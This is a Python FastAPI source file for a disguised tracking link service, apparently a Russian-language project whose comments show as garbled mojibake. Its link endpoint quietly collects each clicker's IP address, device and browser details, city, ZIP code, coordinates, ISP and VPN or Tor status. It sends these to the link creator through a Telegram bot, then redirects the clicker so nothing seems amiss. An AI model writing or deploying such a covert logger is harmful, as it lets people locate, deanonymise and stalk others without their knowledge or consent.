from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse
from cryptography.fernet import Fernet
import httpx
import json
from datetime import datetime
from config import SECRET_KEY, BOT_TOKEN
import user_agents

app = FastAPI()
cipher = Fernet(SECRET_KEY)

VPNAPI_TOKEN = ""  # –æ—Å—Ç–∞–≤—å –ø—É—Å—Ç—ã–º, –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –ø–ª–∞–Ω –ø–æ–∑–≤–æ–ª—è–µ—Ç –±–µ–∑ —Ç–æ–∫–µ–Ω–∞

@app.get("/link/{encrypted_url}")
async def redirect_encrypted(request: Request, encrypted_url: str):
    try:
        data_json = cipher.decrypt(encrypted_url.encode()).decode()
        data = json.loads(data_json)
        original_url = data["url"]
        user_id = data["user_id"]
    except:
        return {"error": "Invalid link"}

    ip = request.client.host
    headers = request.headers
    user_agent_str = headers.get("user-agent", "Unknown")
    ua = user_agents.parse(user_agent_str)
    accept_lang = headers.get("accept-language", "N/A")

    # –ì–µ–æ-–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    geo_info = {}
    try:
        response = httpx.get(f"http://ip-api.com/json/{ip}")
        geo_info = response.json()
    except:
        pass

    # VPN/Proxy/Tor —á–µ—Ä–µ–∑ vpnapi.io
    vpn_info = {}
    try:
        url = f"https://vpnapi.io/api/{ip}?strictness=1&key={VPNAPI_TOKEN}"
        response = httpx.get(url)
        if response.status_code == 200:
            data_vpn = response.json()
            vpn_info = {
                "vpn": data_vpn.get("security", {}).get("vpn", False),
                "proxy": data_vpn.get("security", {}).get("proxy", False),
                "tor": data_vpn.get("security", {}).get("tor", False),
                "asn": data_vpn.get("asn", "N/A"),
                "org": data_vpn.get("organization", "N/A"),
                "connection_type": data_vpn.get("connection_type", "N/A"),
                "timezone": data_vpn.get("time_zone", "N/A")
            }
    except:
        vpn_info = {
            "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
            "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
        }

    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    msg_text = f"""
üîó *–ö—Ç–æ-—Ç–æ –∫–ª–∏–∫–Ω—É–ª –ø–æ —Ç–≤–æ–µ–π —Å—Å—ã–ª–∫–µ!*

üïí –í—Ä–µ–º—è: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
üåê IP: {ip}
üñ• User-Agent: {user_agent_str}
üåè –Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã: {accept_lang}

üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {ua.os.family} {ua.os.version_string}
üåç –ë—Ä–∞—É–∑–µ—Ä: {ua.browser.family} {ua.browser.version_string}
üì± –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {ua.device.family}

üèô –ì–µ–æ:
- –°—Ç—Ä–∞–Ω–∞: {geo_info.get('country', 'N/A')}
- –†–µ–≥–∏–æ–Ω: {geo_info.get('regionName', 'N/A')}
- –ì–æ—Ä–æ–¥: {geo_info.get('city', 'N/A')}
- ZIP: {geo_info.get('zip', 'N/A')}
- ISP: {geo_info.get('isp', 'N/A')}
- –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã (–®–∏—Ä–∏–Ω–∞/–î–æ–ª–≥–æ—Ç–∞)—è: {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}

üåê –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:
- ASN: {vpn_info.get('asn')}
- –û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è: {vpn_info.get('org')}
- –¢–∏–ø –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {vpn_info.get('connection_type')}
- –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: {vpn_info.get('timezone')}

üîí VPN/Proxy/Tor:
- VPN: {vpn_info.get('vpn')}
- Proxy: {vpn_info.get('proxy')}
- Tor: {vpn_info.get('tor')}
"""

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": user_id, "text": msg_text, "parse_mode": "Markdown"}
            )
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", e)

    return RedirectResponse(original_url)


if __name__ == "__main__":
    import uvicorn
    print("–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É 8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)